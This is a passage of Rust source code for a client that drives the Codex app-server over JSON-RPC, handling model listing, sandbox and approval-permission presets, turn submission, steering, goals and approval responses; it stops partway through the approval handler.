//! Codex provider: a small client for the newline-delimited JSON protocol used
//! by `codex app-server`.

#[path="codex_protocol.rs"]
mod protocol;

use std::collections::{HashMap, HashSet};
use std::io::BufWriter;
#[cfg(test)]
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStdin, Stdio};

use serde_json::{Value, json};
use crate::{LaterHistory, RewindFailure, RewindFailureReason};
use smol::channel::{Receiver, Sender};

use crate::actor::{self, EventSenderExt as _, SessionActor, TransportOutcome};
use crate::process::{ChildOutput, StderrTail, send_json as write_json, spawn_line_reader};
use crate::{
    AgentError, AgentEvent, ApprovalDecision, ApprovalKind, ApprovalOption, ApprovalOptionKind,
    ApprovalRequest, Attachment, ChangeCompleteness, DeltaKind, FileChange, FileChangeKind, Goal,
    GoalStatus, ItemContent, ItemStatus, LaunchEnv, ModelSpec, OptionDescriptor, OptionSelection,
    PlanStep, PlanStepStatus, ProviderCommand, ProviderCommandKind, ProviderKind, ResumeCursor,
    SelectOption, SessionCommand, SessionHandle, SessionOptions, ThreadItem, TokenUsage,
    TurnOptions, TurnStatus, UserInputDelivery, UserInputOption, UserInputQuestion,
    file_changes_from_unified_diff, permission_control, selection_str,
};

mod developer_instructions;
mod model_windows;
pub(crate) mod plugins;
pub use developer_instructions::PREVIEW_BROWSER_INSTRUCTIONS;

/// The `additionalContext` key [`SessionOptions::instructions`] ride under.
const INSTRUCTIONS_CONTEXT_KEY: &str = "tcode";

// Codex caps each additionalContext value at 4,000 UTF-8 bytes.
fn instruction_entries(instructions: &str) -> Vec<(String, &str)> {
    let mut entries = Vec::new();
    let mut remaining = instructions;
    while !remaining.is_empty() {
        let mut end = remaining.len().min(4_000);
        while !remaining.is_char_boundary(end) { end -= 1; }
        let key = if instructions.len() <= 4_000 { INSTRUCTIONS_CONTEXT_KEY.to_owned() }
            else { format!("{INSTRUCTIONS_CONTEXT_KEY}_{:04}", entries.len()) };
        entries.push((key, &remaining[..end]));
        remaining = &remaining[end..];
    }
    entries
}

/// Fallback model slug for `collaborationMode.settings.model` when the session
/// has no resolved model yet.
const DEFAULT_MODEL: &str = "gpt-5-codex";
const ELICITATION_URL_ACK_LABEL: &str = "I've opened the link";
const ELICITATION_URL_CANCEL_LABEL: &str = "Cancel";

fn permission_params(value: &str, turn: bool) -> Result<Value, String> {
    let (sandbox, policy, reviewer) = match value {
        "ask" => ("workspace-write", "on-request", "user"),
        "auto_review" | "guardian_subagent" => ("workspace-write", "on-request", "auto_review"),
        "read_only" => ("read-only", "on-request", "user"),
        "full_access" => ("danger-full-access", "never", "user"),
        value
            if value
                .strip_prefix("profile:")
                .is_some_and(|id| !id.is_empty()) =>
        {
            return Ok(
                json!({"permissions": &value[8..], "approvalPolicy": "on-request", "approvalsReviewer": "user"}),
            );
        }
        _ => return Err(format!("unknown Codex permission value: {value}")),
    };
    let mut params = json!({"approvalPolicy": policy, "approvalsReviewer": reviewer});
    if turn {
        params["sandboxPolicy"] = match sandbox {
            "workspace-write" => {
                json!({"type":"workspaceWrite", "writableRoots":[], "networkAccess":false, "excludeTmpdirEnvVar":false, "excludeSlashTmp":false})
            }
            "read-only" => json!({"type":"readOnly", "networkAccess":false}),
            _ => json!({"type":"dangerFullAccess"}),
        };
    } else {
        params["sandbox"] = json!(sandbox);
    }
    Ok(params)
}

fn requested_permission(selections: &[OptionSelection]) -> String {
    match selection_str(selections, "permissions").as_deref() {
        Some("guardian_subagent") => "auto_review".into(),
        Some(value) => value.into(),
        None => "ask".into(),
    }
}

fn effective_permission(result: &Value) -> String {
    let profile = result
        .pointer("/activePermissionProfile/id")
        .and_then(Value::as_str);
    if let Some(id) = profile.filter(|id| !id.starts_with(':')) {
        return format!("profile:{id}");
    }
    let sandbox = result
        .get("sandboxPolicy")
        .or_else(|| result.get("sandbox"));
    let sandbox = sandbox
        .and_then(|value| value.get("type").or(Some(value)))
        .and_then(Value::as_str);
    let policy = result.get("approvalPolicy").and_then(Value::as_str);
    let reviewer = result
        .get("approvalsReviewer")
        .and_then(Value::as_str)
        .unwrap_or("user");
    match (sandbox, policy, reviewer) {
        (Some("workspaceWrite" | "workspace-write"), Some("on-request"), "user") => "ask".into(),
        (
            Some("workspaceWrite" | "workspace-write"),
            Some("on-request"),
            "auto_review" | "guardian_subagent",
        ) => "auto_review".into(),
        (Some("readOnly" | "read-only"), Some("on-request"), "user") => "read_only".into(),
        (Some("dangerFullAccess" | "danger-full-access"), Some("never"), "user") => {
            "full_access".into()
        }
        _ => format!(
            "effective:{}",
            json!({"approvalPolicy":result.get("approvalPolicy"), "approvalsReviewer":reviewer, "sandbox":result.get("sandboxPolicy").or_else(|| result.get("sandbox")), "activePermissionProfile":result.get("activePermissionProfile")})
        ),
    }
}

fn current_permission_option(effective: &str, settings: &Value) -> SelectOption {
    let sandbox = settings
        .get("sandboxPolicy")
        .or_else(|| settings.get("sandbox"));
    let sandbox = sandbox
        .and_then(|value| value.get("type").or(Some(value)))
        .and_then(Value::as_str);
    let sandbox = match sandbox {
        Some("readOnly" | "read-only") => "read-only sandbox",
        Some("workspaceWrite" | "workspace-write") => "workspace sandbox",
        Some("dangerFullAccess" | "danger-full-access") => "full access",
        Some("externalSandbox" | "external-sandbox") => "external sandbox",
        _ => "unspecified sandbox",
    };
    let approval = match settings.get("approvalPolicy") {
        Some(Value::String(policy)) => match policy.as_str() {
            "on-request" => "asks on request",
            "never" => "never asks for approval",
            "untrusted" => "asks for untrusted actions",
            "granular" => "uses granular approval rules",
            _ => "unspecified approval policy",
        },
        Some(Value::Object(policy)) if policy.contains_key("granular") => {
            "uses granular approval rules"
        }
        _ => "unspecified approval policy",
    };
    let reviewer = match settings.get("approvalsReviewer").and_then(Value::as_str) {
        Some("auto_review" | "guardian_subagent") => "reviewed by auto-review",
        Some("user") | None => "reviewed by you",
        _ => "unspecified reviewer",
    };
    let profile = settings
        .pointer("/activePermissionProfile/id")
        .and_then(Value::as_str)
        .or_else(|| effective.strip_prefix("profile:"));
    let prefix = profile
        .map(|id| format!("Profile {id}: "))
        .unwrap_or_default();
    SelectOption {
        value: effective.into(),
        label: profile.unwrap_or("Current permissions").into(),
        description: Some(format!("{prefix}{sandbox}, {approval}, {reviewer}.")),
        unavailable: Some("Inherited permission configuration".into()),
    }
}

fn permission_descriptor(
    profiles: &[Value],
    effective: &str,
    settings: &Value,
) -> OptionDescriptor {
    let mut descriptor = permission_control(ProviderKind::Codex).expect("Codex permission control");
    let OptionDescriptor::Select { options, .. } = &mut descriptor else {
        unreachable!()
    };
    for profile in profiles {
        let Some(id) = profile.get("id").and_then(Value::as_str) else {
            continue;
        };
        if id.starts_with(':') {
            if profile.get("allowed").and_then(Value::as_bool) == Some(false) {
                for option in options.iter_mut().filter(|option| match id {
                    ":workspace" => matches!(option.value.as_str(), "ask" | "auto_review"),
                    ":read-only" => option.value == "read_only",
                    ":danger-full-access" => option.value == "full_access",
                    _ => false,
                }) {
                    option.unavailable = Some("Not allowed by your configuration".into());
                }
            }
            continue;
        }
        let value = format!("profile:{id}");
        if options.iter().any(|option| option.value == value) {
            continue;
        }
        options.push(SelectOption {
            value,
            label: id.into(),
            description: Some(
                profile
                    .get("description")
                    .and_then(Value::as_str)
                    .filter(|description| !description.is_empty())
                    .unwrap_or("Configured permission profile")
                    .into(),
            ),
            unavailable: (profile.get("allowed").and_then(Value::as_bool) == Some(false))
                .then(|| "Not allowed by your configuration".into()),
        });
    }
    if !options.iter().any(|option| option.value == effective) {
        options.push(current_permission_option(effective, settings));
    }
    descriptor
}

/// Starts an app-server process and waits until its thread is ready.
pub async fn start(opts: SessionOptions) -> Result<SessionHandle, AgentError> {
    crate::spawn_session(
        ProviderKind::Codex,
        opts,
        run_actor,
        "codex actor exited before reporting startup status",
    )
    .await
}

/// Spawn `codex app-server`, page through `model/list` (initial `{}`, then
/// `{cursor}` until `nextCursor` is empty), and tear the process down.
pub async fn list_models(
    binary_path: Option<PathBuf>,
    launch_env: LaunchEnv,
) -> Result<Vec<ModelSpec>, AgentError> {
    let (mut child, mut stdin, lines, mut stderr_tail) =
        spawn_server(binary_path.as_deref(), &[], &launch_env)?;
    let windows = home_dir(&launch_env)
        .map(|home| model_windows::read(&home))
        .unwrap_or_default();
    let result = collect_models(&mut stdin, &lines, &windows).await;
    // The stdout reader can observe EOF a few milliseconds before the process
    // becomes waitable. Give a self-exiting child time to publish its real
    // status so `stop_child` does not replace it with a kill status.
    let status = result
        .is_err()
        .then(|| settle_child_exit(&mut child))
        .flatten();
    stop_child(&mut child, stdin);
    result.map_err(|err| enrich_startup_error(err, status, &mut stderr_tail))
}

/// Read the account-wide rate limits from `codex app-server` and tear the
/// process down after the single request completes.
pub async fn read_rate_limits(
    binary_path: Option<PathBuf>,
    launch_env: LaunchEnv,
) -> Result<Value, AgentError> {
    let (mut child, mut stdin, lines, mut stderr_tail) =
        spawn_server(binary_path.as_deref(), &[], &launch_env)?;
    let result = async {
        initialize(&mut stdin, &lines).await?;
        send_json(
            &mut stdin,
            &json!({ "id": 2, "method": "account/rateLimits/read", "params": {} }),
        )?;
        wait_for_response(&lines, 2).await
    }
    .await;
    let status = result
        .is_err()
        .then(|| settle_child_exit(&mut child))
        .flatten();
    stop_child(&mut child, stdin);
    result.map_err(|err| enrich_startup_error(err, status, &mut stderr_tail))
}

async fn initialize(
    stdin: &mut BufWriter<ChildStdin>,
    lines: &Receiver<ChildOutput>,
) -> Result<(), AgentError> {
    initialize_with_capabilities(stdin,lines,true).await
}
fn thread_section_name(opts: &SessionOptions) -> Option<&str> {
    opts.launch_env.env.iter().rev().find(|(key, _)| key == "MUTEKI_CODEX_THREAD_SECTION")
        .map(|(_, value)| value.trim()).filter(|value| !value.is_empty())
}

async fn initialize_with_capabilities(stdin: &mut BufWriter<ChildStdin>,lines: &Receiver<ChildOutput>,experimental: bool) -> Result<(),AgentError> {
    send_json(
        stdin,
        &json!({
            "id": 1,
            "method": "initialize",
            "params": {
                "clientInfo": { "name": "tcode", "title": "Tcode", "version": env!("CARGO_PKG_VERSION") },
                "capabilities": { "experimentalApi": experimental }
            }
        }),
    )?;
    wait_for_response(lines, 1).await?;
    send_json(stdin, &json!({ "method": "initialized" }))
}

/// Codex's home: the profile override, else `~/.codex`.
pub fn home_dir(launch_env: &LaunchEnv) -> Option<PathBuf> {
    launch_env
        .home
        .clone()
        .or_else(|| dirs::home_dir().map(|home| home.join(".codex")))
}

async fn collect_models(
    stdin: &mut BufWriter<ChildStdin>,
    lines: &Receiver<ChildOutput>,
    windows: &HashMap<String, model_windows::ModelWindows>,
) -> Result<Vec<ModelSpec>, AgentError> {
    initialize(stdin, lines).await?;

    let mut models = Vec::new();
    let mut cursor: Option<String> = None;
    let mut id = 2;
    loop {
        let params = match &cursor {
            Some(cursor) => json!({ "cursor": cursor }),
            None => json!({}),
        };
        send_json(
            stdin,
            &json!({ "id": id, "method": "model/list", "params": params }),
        )?;
        let response = wait_for_response(lines, id).await?;
        id += 1;
        if let Some(data) = response.get("data").and_then(Value::as_array) {
            for model in data {
                let slug = model.get("model").and_then(Value::as_str);
                if let Some(spec) = map_model(model, slug.and_then(|slug| windows.get(slug))) {
                    models.push(spec);
                }
            }
        }
        cursor = response
            .get("nextCursor")
            .and_then(Value::as_str)
            .filter(|s| !s.is_empty())
            .map(str::to_owned);
        if cursor.is_none() {
            break;
        }
    }
    Ok(models)
}

/// Map one `model/list` entry to a [`ModelSpec`]; `None` for hidden models.
fn map_model(model: &Value, windows: Option<&model_windows::ModelWindows>) -> Option<ModelSpec> {
    if model
        .get("hidden")
        .and_then(Value::as_bool)
        .unwrap_or(false)
    {
        return None;
    }
    let id = model.get("model").and_then(Value::as_str)?.to_owned();
    let display_name = codex_display_name(
        model
            .get("displayName")
            .and_then(Value::as_str)
            .unwrap_or(&id),
    );
    let is_default = model
        .get("isDefault")
        .and_then(Value::as_bool)
        .unwrap_or(false);

    let mut options = Vec::new();

    if let Some(efforts) = model
        .get("supportedReasoningEfforts")
        .and_then(Value::as_array)
    {
        let select_options: Vec<SelectOption> = efforts
            .iter()
            .filter_map(|entry| {
                let value = entry
                    .get("reasoningEffort")
                    .and_then(Value::as_str)?
                    .to_owned();
                let label = reasoning_effort_label(&value);
                let description = entry
                    .get("description")
                    .and_then(Value::as_str)
                    .filter(|s| !s.is_empty())
                    .map(str::to_owned);
                Some(SelectOption {
                    unavailable: None,
                    value,
                    label,
                    description,
                })
            })
            .collect();
        if !select_options.is_empty() {
            let default_value = model
                .get("defaultReasoningEffort")
                .and_then(Value::as_str)
                .map(str::to_owned);
            options.push(OptionDescriptor::Select {
                role: Default::default(),
                apply: Default::default(),
                recommended: None,
                permissive: None,
                id: "reasoningEffort".into(),
                label: "Reasoning".into(),
                options: select_options,
                default_value,
            });
        }
    }

    let tiers = service_tiers(model);
    if !tiers.is_empty() {
        let default_value = model
            .get("defaultServiceTier")
            .and_then(Value::as_str)
            .filter(|d| tiers.iter().any(|t| t.value == *d))
            .map(str::to_owned)
            .unwrap_or_else(|| "default".into());
        let mut select_options = Vec::with_capacity(tiers.len() + 1);
        select_options.push(SelectOption {
            unavailable: None,
            value: "default".into(),
            label: "Standard".into(),
            description: None,
        });
        select_options.extend(tiers);
        options.push(OptionDescriptor::Select {
            role: Default::default(),
            apply: Default::default(),
            recommended: None,
            permissive: None,
            id: "serviceTier".into(),
            label: "Service Tier".into(),
            options: select_options,
            default_value: Some(default_value),
        });
    }
    options.push(context_window_descriptor(windows));

    Some(ModelSpec {
        id,
        display_name,
        is_default,
        options,
    })
}

/// Derive service-tier options from `serviceTiers` (preferred) or, absent that,
/// `additionalSpeedTiers`, displaying the `fast` value as `Fast`.
/// The `contextWindow` selector: the native window (default) and the largest
/// one Codex accepts for `model_context_window`. Without cached windows the
/// selector has no presets and the custom size stands alone.
fn context_window_descriptor(windows: Option<&model_windows::ModelWindows>) -> OptionDescriptor {
    let preset = |tokens: u64| {
        let label = crate::context_window::format(tokens);
        SelectOption {
            value: label.to_ascii_lowercase(),
            label,
            description: None,
            unavailable: None,
        }
    };
    let (options, default_value) = match windows {
        Some(windows) => {
            let mut options = vec![preset(windows.native)];
            if windows.largest > windows.native {
                options.push(preset(windows.largest));
            }
            let default_value = Some(options[0].value.clone());
            (options, default_value)
        }
        None => (Vec::new(), None),
    };
    OptionDescriptor::Select {
        role: Default::default(),
        apply: Default::default(),
        recommended: None,
        permissive: None,
        id: crate::context_window::OPTION_ID.into(),
        label: "Context Window".into(),
        options,
        default_value,
    }
}

fn service_tiers(model: &Value) -> Vec<SelectOption> {
    if let Some(tiers) = model.get("serviceTiers").and_then(Value::as_array)
        && !tiers.is_empty()
    {
        return tiers
            .iter()
            .filter_map(|tier| {
                let value = tier.get("id").and_then(Value::as_str)?.to_owned();
                let label = tier
                    .get("name")
                    .and_then(Value::as_str)
                    .unwrap_or(&value)
                    .to_owned();
                let description = tier
                    .get("description")
                    .and_then(Value::as_str)
                    .filter(|s| !s.is_empty())
                    .map(str::to_owned);
                Some(SelectOption {
                    unavailable: None,
                    value,
                    label,
                    description,
                })
            })
            .collect();
    }
    if let Some(speed) = model.get("additionalSpeedTiers").and_then(Value::as_array) {
        return speed
            .iter()
            .filter_map(|tier| {
                let value = tier.as_str()?.to_owned();
                let label = if value == "fast" {
                    "Fast".to_owned()
                } else {
                    value.clone()
                };
                Some(SelectOption {
                    unavailable: None,
                    value,
                    label,
                    description: None,
                })
            })
            .collect();
    }
    Vec::new()
}

/// Format model ids for display: `gpt…` → `GPT…`, capitalizing the letter
/// after each hyphen.
fn codex_display_name(raw: &str) -> String {
    let base = if raw.get(..3).is_some_and(|p| p.eq_ignore_ascii_case("gpt")) {
        format!("GPT{}", &raw[3..])
    } else {
        raw.to_owned()
    };
    let mut out = String::with_capacity(base.len());
    let mut after_hyphen = false;
    for c in base.chars() {
        if after_hyphen && c.is_ascii_lowercase() {
            out.push(c.to_ascii_uppercase());
        } else {
            out.push(c);
        }
        after_hyphen = c == '-';
    }
    out
}

fn reasoning_effort_label(effort: &str) -> String {
    match effort {
        "none" => "None",
        "minimal" => "Minimal",
        "low" => "Low",
        "medium" => "Medium",
        "high" => "High",
        "xhigh" => "Extra High",
        "max" => "Max",
        "ultra" => "Ultra",
        other => return other.to_owned(),
    }
    .to_owned()
}

/// Selected reasoning effort (option id `reasoningEffort`).
fn codex_effort(selections: &[OptionSelection]) -> Option<String> {
    selection_str(selections, "reasoningEffort")
}

/// Selected service tier (option id `serviceTier`).
fn codex_service_tier(selections: &[OptionSelection]) -> Option<String> {
    selection_str(selections, "serviceTier")
}

/// Per-thread `config` overrides for `thread/start`, `thread/resume` and
/// `thread/fork`: nothing is written to the user's `config.toml`. A selected
/// context window becomes `model_context_window`, which Codex clamps to the
/// model's largest window and compacts against.
fn thread_config(selections: &[OptionSelection]) -> Option<Value> {
    let window = crate::context_window::selected(&[], selections)?;
    Some(json!({ "model_context_window": window }))
}

enum PendingRequest {
    Operation{request_id:String},
    RewindApply { checkpoint:String, mode:crate::RewindMode },
    TurnStart {
        permission: String,
        settings: Option<Value>,
    },
    Interrupt,
    Steer {
        request_id: String,
        text: String,
    },
    SubagentMetadata {
        parent_id: String,
    },
    GuardianApproval {
        request_id: String,
        decision: ApprovalDecision,
    },
    InjectItems,
    AttachmentContext { params: Value, delivery_id: u64 },
    Compact,
    /// `thread/goal/set` or `thread/goal/clear`; the result arrives again as
    /// `thread/goal/updated` / `thread/goal/cleared`.
    GoalChange,
    /// `thread/goal/get` at startup: the snapshot a resumed thread pushes may
    /// arrive while startup still waits for its own responses.
    GoalSnapshot,
}

struct PendingApproval {
    rpc_id: Value,
    replies: HashMap<String, Value>,
    cancel_reply: Value,
    cancel_interrupt: Option<Value>,
}

struct PendingElicitation {
    rpc_id: Value,
    fields: Vec<ElicitField>,
}

struct ElicitField {
    key: String,
    kind: ElicitFieldKind,
}

#[derive(Clone, Copy)]
enum ElicitFieldKind { Typed, UrlAck }

struct Actor {
    protocol:protocol::Protocol,
    child: Child,
    stderr_tail: StderrTail,
    stdin: BufWriter<ChildStdin>,
    lines: Receiver<ChildOutput>,
    events: Sender<AgentEvent>,
    thread_id: String,
    cwd: PathBuf,
    /// Resolved model slug; used for `collaborationMode.settings.model`.
    model: Option<String>,
    /// Session reasoning effort (`reasoningEffort` selection), if any.
    effort: Option<String>,
    /// Session service tier (`serviceTier` selection), if any.
    service_tier: Option<String>,
    requested_permission: String,
    effective_permission: String,
    permission_descriptor: OptionDescriptor,
    next_id: i64,
    pending_requests: HashMap<i64, PendingRequest>,
    approvals: HashMap<String, PendingApproval>,
    guardian_denials: HashMap<String, Value>,
    /// Pending `item/tool/requestUserInput` requests: canonical request_id → the
    /// server-to-client JSON-RPC id we must reply to.
    user_inputs: HashMap<String, Value>,
    /// Pending `mcpServer/elicitation/request`s: canonical request_id → the
    /// JSON-RPC id and field typing needed to rebuild a typed response.
    elicitations: HashMap<String, PendingElicitation>,
    /// Open `request_user_input_async` questions of the running turn, under
    /// the request id of the latest asking message. The model keeps working;
    /// answers go back as a `turn/steer` carrying Codex's reply envelope, and
    /// the turn's end discards whatever is still unanswered.
    async_questions: Option<(String, Vec<UserInputQuestion>)>,
    items: HashMap<String, ThreadItem>,
    current_turn_items: HashSet<String>,
    subagents: HashMap<String, CodexSubagent>,
    /// Stable parent capsule for each provider-native child thread. Codex 0.150
    /// gives completion activities a fresh item id, so the activity id cannot
    /// be the lifecycle identity after spawn.
    subagent_parent_by_thread: HashMap<String, String>,
    /// The v2 item lifecycle and its legacy fan-out describe the same activity.
    /// Track their provider identity so only one canonical transition is sent.
    seen_subagent_activities: HashSet<String>,
    usage_by_turn: HashMap<String, TokenUsage>,
    usage_totals_by_turn: HashMap<String, Value>,
    active_turn: Option<String>,
    retry: Option<crate::TurnRetry>,
    retry_deadline: Option<std::time::Instant>,
    capacity_retries: usize,
    last_turn_options: Option<TurnOptions>,
    interrupted: bool,
    /// Steers the server acknowledged but has not yet consumed, as
    /// `(request_id, text)`. `turn/steer` only enqueues the input; the turn
    /// loop drains it before its next model request and echoes it back as a
    /// `userMessage` item, which is the real acceptance signal.
    pending_steers: Vec<(String, String)>,
    /// [`SessionOptions::instructions`], sent as `turn/start.additionalContext`.
    instructions: Option<String>,
}

#[derive(Debug, Clone)]
struct CodexSubagent {
    agent_type: String,
    description: String,
    child_item_id: String,
    model: Option<String>,
    effort: Option<String>,
}

async fn run_actor(
    opts: SessionOptions,
    commands: Receiver<SessionCommand>,
    events: Sender<AgentEvent>,
    ready: Sender<Result<(), AgentError>>,
) {
    let protocol=protocol::discover(&opts).await;
    let mut extra_args = mcp_args(&opts.mcp_servers);
    extra_args.extend(opts.extra_args.iter().cloned());
    let (mut child, mut stdin, lines, mut stderr_tail) =
        match spawn_server(opts.binary_path.as_deref(), &extra_args, &opts.launch_env) {
            Ok(parts) => parts,
            Err(err) => {
                let _ = ready.send(Err(err)).await;
                return;
            }
        };

    let _=events.try_send(AgentEvent::ProcessStarted{pid:child.id()});
    let startup = initialize_and_open_thread(&opts, &mut stdin, &lines, &protocol, &events).await;
    let OpenedThread {
        thread_id,
        model,
        next_id,
        provider_commands,
        permission_descriptor,
        effective_permission,
    } = match startup {
        Ok(value) => value,
        Err(err) => {
            // As in model discovery, stdout EOF may beat process termination
            // by a scheduling tick. Preserve the provider's natural status.
            let status = settle_child_exit(&mut child);
            stop_child(&mut child, stdin);
            let err = enrich_startup_error(err, status, &mut stderr_tail);
            let _ = ready.send(Err(err)).await;
            return;
        }
    };

    let mut actor = Actor {
        protocol:protocol.clone(),
        child,
        stderr_tail,
        stdin,
        lines,
        events,
        thread_id: thread_id.clone(),
        cwd: opts.cwd.clone(),
        model: model.clone(),
        effort: codex_effort(&opts.option_selections),
        service_tier: codex_service_tier(&opts.option_selections),
        requested_permission: requested_permission(&opts.option_selections),
        effective_permission,
        permission_descriptor,
        next_id,
        pending_requests: HashMap::new(),
        approvals: HashMap::new(),
        guardian_denials: HashMap::new(),
        user_inputs: HashMap::new(),
        elicitations: HashMap::new(),
        async_questions: None,
        items: HashMap::new(),
        current_turn_items: HashSet::new(),
        subagents: HashMap::new(),
        subagent_parent_by_thread: HashMap::new(),
        seen_subagent_activities: HashSet::new(),
        usage_by_turn: HashMap::new(),
        usage_totals_by_turn: HashMap::new(),
        active_turn: None,
        retry: None,
        retry_deadline: None,
        capacity_retries: 0,
        last_turn_options: None,
        interrupted: false,
        pending_steers: Vec::new(),
        instructions: opts.instructions.clone(),
    };

    actor.events.emit(AgentEvent::RuntimeCapabilities{capabilities:json!({"native_rewind":protocol.methods.contains("thread/revert"),"plan":protocol.plan,"fork":protocol.fork_at_turn,"operations":([("goal","thread/goal/get"),("mcp","mcpServerStatus/list"),("status","thread/read"),("usage","account/rateLimits/read"),("models","model/list"),("skills","skills/list"),("hooks","hooks/list"),("plugins","plugin/list"),("apps","app/list")].into_iter().filter(|(_,method)|protocol.methods.contains(*method)).map(|(name,_)|name).collect::<Vec<_>>()),"methods":protocol.methods})}).await;
    let started = AgentEvent::SessionStarted {
        provider_session_id: thread_id.clone(),
        resume: ResumeCursor(json!({ "thread_id": thread_id })),
        model,
    };
    if actor.events.send(started).await.is_err() {
        let _ = ready
            .send(Err(AgentError::Protocol("event channel closed".into())))
            .await;
        stop_child(&mut actor.child, actor.stdin);
        return;
    }
    actor.emit_permissions(None).await;
    // Replace the composer's cached `/` + `$` menu data even when discovery is
    // empty, so removed prompts/skills do not linger from a prior session.
    actor
        .events
        .emit(AgentEvent::ProviderCommands {
            commands: provider_commands,
        })
        .await;
    let thread = json!({ "threadId": actor.thread_id });
    if let Err(err) = actor.request("thread/goal/get", thread, PendingRequest::GoalSnapshot) {
        log::debug!("Codex thread/goal/get not sent: {err}");
    }
    if ready.send(Ok(())).await.is_err() {
        stop_child(&mut actor.child, actor.stdin);
        return;
    }

    actor::run(actor, &commands).await;
}

impl SessionActor for Actor {
    type TransportItem = ChildOutput;

    fn transport(&self) -> &Receiver<Self::TransportItem> {
        &self.lines
    }

    fn events(&self) -> &Sender<AgentEvent> {
        &self.events
    }

    fn command_failure_reason(&self) -> &'static str {
        "protocol write failed"
    }

    async fn handle_command(&mut self, command: SessionCommand) -> Result<(), String> {
        if let SessionCommand::SetOption{id,value}=&command && id=="muteki:operation" {
            let request_id=value["request_id"].as_str().unwrap_or("").to_owned();let name=value["name"].as_str().unwrap_or("");let arguments=value["arguments"].as_str().unwrap_or("");
            let result=(||{
                if self.active_turn.is_some(){return Err("Codex native turn is active".into());}
                let(method,params)=match name{
                    "goal"=>(if arguments.is_empty(){"thread/goal/get"}else if matches!(arguments,"off"|"clear"){"thread/goal/clear"}else{"thread/goal/set"},if arguments.is_empty()||matches!(arguments,"off"|"clear"){json!({"threadId":self.thread_id})}else{json!({"threadId":self.thread_id,"objective":arguments})}),
                    "mcp" if arguments=="reload"=>("config/mcpServer/reload",json!({})),
                    _ if !arguments.is_empty()=>return Err(format!("/{name} accepts no arguments")),
                    "status"=>("thread/read",json!({"threadId":self.thread_id,"includeTurns":false})),"usage"=>("account/rateLimits/read",json!({})),"models"=>("model/list",json!({"limit":100})),
                    "skills"=>("skills/list",json!({"cwds":[self.cwd],"forceReload":false})),"hooks"=>("hooks/list",json!({"cwds":[self.cwd]})),"plugins"=>("plugin/list",json!({"cwds":[self.cwd],"forceRefetch":false,"marketplaceKinds":["local","workspace-directory"]})),
                    "apps"=>("app/list",json!({"threadId":self.thread_id,"limit":100,"forceRefetch":false})),"mcp"=>("mcpServerStatus/list",json!({"threadId":self.thread_id,"detail":"toolsAndAuthOnly","limit":100})),_=>return Err(format!("Unsupported Codex operation {name}"))};
                if !self.protocol.methods.contains(method){return Err(format!("Installed Codex schema does not advertise {method}"));}
                self.request(method,params,PendingRequest::Operation{request_id:request_id.clone()})
            })();
            if let Err(error)=result{self.events.emit(AgentEvent::RuntimeOperationResult{request_id,result:None,error:Some(error)}).await;}return Ok(());
        }
        match command {
            SessionCommand::SendTurn {
                delivery_id,
                text,
                options,
                attachments,
            } => {
                if options.as_ref().and_then(|o|o.interaction_mode.as_deref())==Some("plan") && !self.protocol.plan {
                    self.events.emit(AgentEvent::TurnFailed{code:"codex.plan_unsupported".into(),message:"Plan mode requires experimental API and an advertised collaboration schema".into()}).await;
                    self.events.emit(AgentEvent::TurnCompleted{turn_id:String::new(),status:TurnStatus::Failed,usage:None}).await;return Ok(());
                }

                self.retry = None;
                self.retry_deadline = None;
                self.capacity_retries = 0;
                self.last_turn_options = options.clone();
                self.interrupted = false;
                let mut params = self.build_turn_params(&text, options.as_ref(), &attachments);
                let files = workspace_files(&attachments);
                if files.is_empty() {
                    return self.start_prepared_turn(params, delivery_id).await;
                }
                if self.protocol.additional_context {
                    add_file_context(&mut params, &files);
                    return self.start_prepared_turn(params, delivery_id).await;
                }
                if !self.protocol.methods.contains("thread/inject_items") {
                    self.fail_file_delivery("Installed Codex has no workspace attachment context channel".into()).await;
                    return Ok(());
                }
                // A stable client can append the same untrusted tool output Codex
                // produces for additionalContext. Wait for acceptance before starting.
                let items = json!([{"type":"function_call_output","namespace":"agent",
                    "name":"muteki_attachments","output":serde_json::to_string(&files).expect("file paths serialize")}]);
                self.request("thread/inject_items", json!({"threadId":self.thread_id,"items":items}),
                    PendingRequest::AttachmentContext { params, delivery_id })
            }
            SessionCommand::RetryTurn { turn_id } => {
                if self
                    .retry
                    .as_ref()
                    .is_some_and(|retry| retry.turn_id == turn_id)
                {
                    self.wake().await?;
                }
                Ok(())
            }
            SessionCommand::Interrupt => {
                self.interrupted = true;
                if self.retry.is_some()
                    && !self
                        .pending_requests
                        .values()
                        .any(|request| matches!(request, PendingRequest::TurnStart { .. } | PendingRequest::AttachmentContext { .. }))
                {
                    self.clear_retry().await;
                    return Ok(());
                }
                if self.active_turn.is_none()
                    && self
                        .pending_requests
                        .values()
                        .any(|request| matches!(request, PendingRequest::TurnStart { .. } | PendingRequest::AttachmentContext { .. }))
                {
                    return Ok(());
                }
                let Some(turn_id) = self.active_turn.clone() else {
                    self.events
                        .emit(AgentEvent::Warning {
                            message: "cannot interrupt: no active Codex turn".into(),
                        })
                        .await;
                    return Ok(());
                };
                self.request(
                    "turn/interrupt",
                    json!({"threadId":self.thread_id,"turnId":turn_id}),
                    PendingRequest::Interrupt,
                )
            }
            SessionCommand::RespondApproval {
                request_id,
                decision,
            } => {
                if let Some(params) = self.guardian_denials.get(&request_id).cloned() {
                    match &decision {
                        ApprovalDecision::Option(id)
                            if id == "thread/approveGuardianDeniedAction" =>
                        {
                            self.request(
                                "thread/approveGuardianDeniedAction",
                                params,
                                PendingRequest::GuardianApproval {
                                    request_id,
                                    decision,
                                },
                            )?;
                        }
                        ApprovalDecision::Cancel => {
                            self.guardian_denials.remove(&request_id);
                            self.events
                                .emit(AgentEvent::ApprovalResolved {
                                    request_id,
                                    decision,
                                })
                                .await;
                            if let (Some(thread_id), Some(turn_id)) = (
                                params.get("threadId").and_then(Value::as_str),
                                params.pointer("/event/turn_id").and_then(Value::as_str),
                            ) {
                                self.request(
                                    "turn/interrupt",
                                    json!({"threadId":thread_id,"turnId":turn_id}),
                                    PendingRequest::Interrupt,
                                )?;
                            }
                        }
                        _ => return Err("unknown Codex guardian approval option".into()),
                    }
                    return Ok(());
                }
                let Some(pending) = self.approvals.get(&request_id) else {
                    self.events
                        .emit(AgentEvent::Warning {
                            message: format!("unknown Codex approval request id: {request_id}"),
                        })
                        .await;
                    return Ok(());
                };
                let result = match &decision {
                    ApprovalDecision::Cancel => pending.cancel_reply.clone(),
                    ApprovalDecision::Option(id) => pending
                        .replies
                        .get(id)
                        .cloned()
                        .ok_or_else(|| format!("unknown Codex approval option: {id}"))?,
                };
